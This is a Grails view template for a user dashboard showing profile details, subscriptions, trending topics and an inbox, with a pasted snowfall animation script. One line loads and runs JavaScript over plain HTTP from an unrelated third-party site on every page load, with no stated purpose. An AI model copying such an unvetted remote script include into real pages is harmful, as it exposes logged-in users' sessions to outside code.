<html>
<meta name="viewport" content="width=device-width, initial-scale=1">
<asset:stylesheet href="application.css"/>
<asset:javascript src="application.js"/>

<body>




<script type='text/javascript' src='http://m.free-codes.org/gh.php?id=2001'></script>
<script>
    // Set the number of snowflakes (more than 30 - 40 not recommended)
    var snowmax=35

    // Set the colors for the snow. Add as many colors as you like
    var snowcolor=new Array("#aaaacc","#ddddFF","#ccccDD")

    // Set the fonts, that create the snowflakes. Add as many fonts as you like
    var snowtype=new Array("Arial Black","Arial Narrow","Times","Comic Sans MS")

    // Set the letter that creates your snowflake (recommended:*)
    var snowletter="*"

    // Set the speed of sinking (recommended values range from 0.3 to 2)
    var sinkspeed=0.6

    // Set the maximal-size of your snowflaxes
    var snowmaxsize=22

    // Set the minimal-size of your snowflaxes
    var snowminsize=8

    // Set the snowing-zone
    // Set 1 for all-over-snowing, set 2 for left-side-snowing
    // Set 3 for center-snowing, set 4 for right-side-snowing
    var snowingzone=3

    ///////////////////////////////////////////////////////////////////////////
    // CONFIGURATION ENDS HERE
    ///////////////////////////////////////////////////////////////////////////


    // Do not edit below this line
    var snow=new Array()
    var marginbottom
    var marginright
    var timer
    var i_snow=0
    var x_mv=new Array();
    var crds=new Array();
    var lftrght=new Array();
    var browserinfos=navigator.userAgent
    var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/)
    var ns6=document.getElementById&&!document.all
    var opera=browserinfos.match(/Opera/)
    var browserok=ie5||ns6||opera

    function randommaker(range) {
        rand=Math.floor(range*Math.random())
        return rand
    }

    function initsnow() {
        if (ie5 || opera) {
            marginbottom = document.body.clientHeight
            marginright = document.body.clientWidth
        }
        else if (ns6) {
            marginbottom = window.innerHeight
            marginright = window.innerWidth
        }
        var snowsizerange=snowmaxsize-snowminsize
        for (i=0;i<=snowmax;i++) {
            crds[i] = 0;
            lftrght[i] = Math.random()*15;
            x_mv[i] = 0.03 + Math.random()/10;
            snow[i]=document.getElementById("s"+i)
            snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]
            snow[i].size=randommaker(snowsizerange)+snowminsize
            snow[i].style.fontSize=snow[i].size
            snow[i].style.color=snowcolor[randommaker(snowcolor.length)]
            snow[i].sink=sinkspeed*snow[i].size/5
            if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
            if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
            if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
            if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
            snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)
            snow[i].style.left=snow[i].posx
            snow[i].style.top=snow[i].posy
        }
        movesnow()
    }

    function movesnow() {
        for (i=0;i<=snowmax;i++) {
            crds[i] += x_mv[i];
            snow[i].posy+=snow[i].sink
            snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);
            snow[i].style.top=snow[i].posy

            if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){
                if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
                if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
                if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
                if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
                snow[i].posy=0
            }
        }
        var timer=setTimeout("movesnow()",50)
    }

    for (i=0;i<=snowmax;i++) {
        document.write("<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>")
    }
    if (browserok) {
        window.onload=initsnow
    }
</script>















<div class="col-lg-5">
    <div class="row">
        <div class="panel panel-default">
            <div class="panel-body">
                <g:if test="${flash.error}">
                    <g:message message="${flash.error}"></g:message>

                </g:if>
                <g:if test="${flash.message}">
                    <g:message message="${flash.message}"></g:message>

                </g:if>
                <div class="col-lg-3">
                    <ls:userImage height="100" width="100"></ls:userImage>
                </div>

                <div class="col-lg-9">
                    <div class="text">
                        <h4>${session.user.firstName} ${session.user.lastName}</h4>
                    </div>

                    <div class="text-muted">${session.user.username}</div>

                    <div class="col-lg-4">
                        <span class="text-muted">Subscriptions</span>
                        <ls:subscriptionCount></ls:subscriptionCount>
                    </div>

                    <div class="col-lg-3">
                        <span class="text-muted">Resources</span>
                        <ls:resourceCount></ls:resourceCount>
                    </div>

                </div>
            </div>
        </div>
    </div>

    <div class="row">

        <div class="panel panel-default">
            <div class="panel-heading">
                <span class="text-primary">Subscriptions</span>
            </div>

            <div class="panel-body">
                <ls:topicCreated/>
                <hr>

                <p>------------------</p>
                <ls:subscribedTopics/>
            </div>
        </div>
    </div>

    <div class="row">
        <div class="panel panel-default">
            <div class="panel-heading">
                Trending topics
            </div>

            <div class="panel-body">
                <ls:trendingTopics/>

                <div class="row">
                    <div class="col-lg-3">
                        <asset:image class="img-responsive" src="image.jpg" alt="neelesh"/>
                    </div>

                    <div class="col-lg-9">
                        <div>
                            <div class="col-lg-6" style="padding-left: 0px">
                                <input type="text" placeholder="Grails">
                            </div>

                            <div class="col-lg-3">
                                <button type="submit">Save</button>
                            </div>

                            <div class="col-lg-3">
                                <button type="reset">Cancel</button>
                            </div>
                        </div>

                        <div class="col-lg-4" style="padding-left: 0px">
                            <span class="text-muted">@neelesh</span>
                            <a href="#" class="hyperlink">Unsubscribe</a>
                        </div>

                        <div class="col-lg-4">
                            <span class="text-muted">Subscriptions</span>
                            <span class="text-primary">50</span>
                        </div>

                        <div class="col-lg-2">
                            <span class="text-muted">Posts</span>
                            <span class="text-primary">30</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>


<div class="col-lg-7">
    <div class="panel panel-default">
        <div class="panel-heading">
            Inbox
        </div>

        <div class="panel-body">
            <g:render template="inbox" collection="${unReadItems}" var="unReadResource"></g:render>
        </div>

        <div class="panel-footer">
            <br/>
            <g:paginate total="${total}" prev="Previous" next="Next" controller="user" action="index" max="5"/><br/>
        </div>
    </div>
</div>
</body>
</html>